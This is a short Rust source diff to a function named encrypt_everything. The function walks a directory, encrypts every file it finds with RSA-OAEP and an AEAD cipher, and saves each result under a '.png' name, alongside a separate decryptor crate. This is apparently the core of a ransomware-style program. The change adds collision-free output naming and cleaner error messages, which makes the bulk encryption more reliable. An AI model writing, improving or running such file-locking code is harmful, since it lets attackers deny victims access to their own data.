@@ -9,6 +9,7 @@ use rand::prelude::ThreadRng;
 use rand::RngCore;
 use rsa::{Oaep, RsaPublicKey};
 use sha2::Sha512;
+use decryptor::helpers::gen_new_path;
 use crate::BIGRAT_PNG;
 
 const BUFFER_SIZE: usize = 500;
@@ -77,8 +78,17 @@ pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut Thre
                 },
             };
 
-            // TODO: Check if that file already exists
-            let new_path = PathBuf::from(&format!("{}.png", entry.path().display()));
+            let new_path = match gen_new_path(
+                PathBuf::from(&format!("{}.png", entry.path().display())),
+                false,
+            ) {
+                Ok(path) => path,
+                Err(e) => {
+                    eprintln!("Failed to generate a destination file name from source file {:?}: {}", entry.path(), e);
+                    continue;
+                }
+            };
+
             if let Err(e) = encrypt_file(
                 &mut file,
                 &new_path,
@@ -87,7 +97,7 @@ pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut Thre
                 aead.clone(),
                 nonce.as_ref(),
             ) {
-                eprintln!("Failed to encrypt a file {}: {}", entry.path().display(), e);
+                eprintln!("Failed to encrypt a file {:?}: {}", entry.path(), e);
                 continue;
             };
         }
